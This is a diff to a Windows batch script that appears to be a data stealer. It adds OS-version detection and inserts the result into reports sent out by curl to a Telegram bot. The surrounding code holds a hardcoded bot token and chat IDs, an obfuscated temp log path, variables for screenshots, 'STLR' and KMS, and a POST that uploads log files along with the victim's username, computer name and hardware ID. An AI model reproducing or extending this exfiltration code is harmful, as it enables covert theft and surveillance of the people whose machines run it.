@@ -9,7 +9,7 @@ setlocal enabledelayedexpansion
 ::goto :EOF
 
 
-set "BATCHVERSION=37.4"
+set "BATCHVERSION=37.5"
 set "LOGFILE=%temp%\S1rNsvQgG.mpeez"
 set "RESULT=%TEMP%\TGRESU.txa"
 set "ALLOWED=124"
@@ -482,7 +482,7 @@ for /l %%i in (1,1,12) do echo.
 
 
 ::  Checking If Noot Win 10 & 11 Run Setup Directly!!
-
+set "WindowsVersion=0"
 echo My Windows Version.
 REM Get CurrentBuildNumber from registry
 for /f "tokens=3" %%a in ('reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v CurrentBuildNumber 2^>nul') do (
@@ -491,7 +491,7 @@ for /f "tokens=3" %%a in ('reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Current
 
 REM If not retrieved, fallback to :RUNSETUPDIRECTLY
 if not defined build (
-    rem echo Failed to detect build number. Assuming older Windows.
+   echo Failed to detect build number. Assuming older Windows.
 )
 
 REM Convert to number and compare
@@ -504,18 +504,22 @@ set /a buildnum=%build%
 :: Detect OS based on build number
 if %buildnum% LSS 8000 (
     echo Windows XP or 7
+    set "WindowsVersion=7"
 )
 
 if %buildnum% GEQ 8000 if %buildnum% LSS 9600 (
     echo Windows 8 or 8.1
+    set "WindowsVersion=8.1"
 )
 
 if %buildnum% GEQ 9600 if %buildnum% LSS 22000 (
     echo Windows 10
+    set "WindowsVersion=10"
 )
 
 if %buildnum% GEQ 22000 (
     echo Windows 11
+    set "WindowsVersion=11"
 )
 
 
@@ -2802,7 +2806,7 @@ set "TOKEN_RUNNING=7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA"
 set "CHAT_ID_RUNNING=-1002163721260"
 set "TOPIC_ID_RUNNING=73779"
 ::
-set "MESSAGE_RUNNING=%USERNAME%(%COMPUTERNAME%)|RUNNING%CheckSend%|STLR%MINUTESS%(%COMSTARTED%)|10MNTS(%MINTSS%)|SHST%SHSTRUNNING%.KMS%KMSRUNNING%|%time%|(v%BATCHVERSION%)"
+set "MESSAGE_RUNNING=%USERNAME%(%COMPUTERNAME%)W%WindowsVersion%|RUNNING%CheckSend%|STLR%MINUTESS%(%COMSTARTED%)|10MNTS(%MINTSS%)|SHST%SHSTRUNNING%.KMS%KMSRUNNING%|%time%|(v%BATCHVERSION%)"
 set "ENCODED_MESSAGE_RUNNING=%MESSAGE_RUNNING: =%%2"
 set "CAPTION_RUNNING=This is a document for RUNNING Topic"
 set "FILE_PATH_RUNNING=%temp%\RUNNING_Topic.txt"
@@ -3162,7 +3166,7 @@ set "TOPIC_ID_UPDATESSCRNSHTS=73936"
 set "MESSAGE_UPDATESSCRNSHTS=%USERNAME%(%COMPUTERNAME%) | RUNNING Topic Update | %time% | (v)"
 set "ENCODED_MESSAGE_UPDATESSCRNSHTS=%MESSAGE_RUNNING: =%%20"
 set "CAPTION_UPDATESSCRNSHTS=Computer|%USERNAME%(%COMPUTERNAME%)|%HWID%|STARTED|%MESSAGE%%time%|(v%BATCHVERSION%)"
-set "CAPTION_UPDATESSCRNSHTS=%USERNAME%(%COMPUTERNAME%)|%HWID%|STARTED|%MESSAGE%%time%|(v%BATCHVERSION%)"
+set "CAPTION_UPDATESSCRNSHTS=%USERNAME%(%COMPUTERNAME%)W%WindowsVersion%|%HWID%|STARTED|%MESSAGE%%time%|(v%BATCHVERSION%)"
 set "FILE_PATH_UPDATESSCRNSHTS=%temp%\RUNNING_Topic.txt"
 
 
@@ -3213,7 +3217,7 @@ if %errorlevel%==0 (
 curl -s -X POST "https://api.telegram.org/bot%TOKEN_UPDATESSCRNSHTS%/sendDocument" ^
      -F "chat_id=%CHAT_ID_UPDATESSCRNSHTS%" ^
      -F "message_thread_id=%TOPIC_ID_UPDATESSCRNSHTS%" ^
-     -F "caption=%USERNAME%(%COMPUTERNAME%)|%time%" ^
+     -F "caption=%USERNAME%(%COMPUTERNAME%)W%WindowsVersion%|%time%" ^
      -F "document=@%LOGFILE1%" > "%RESULT%"
 
 
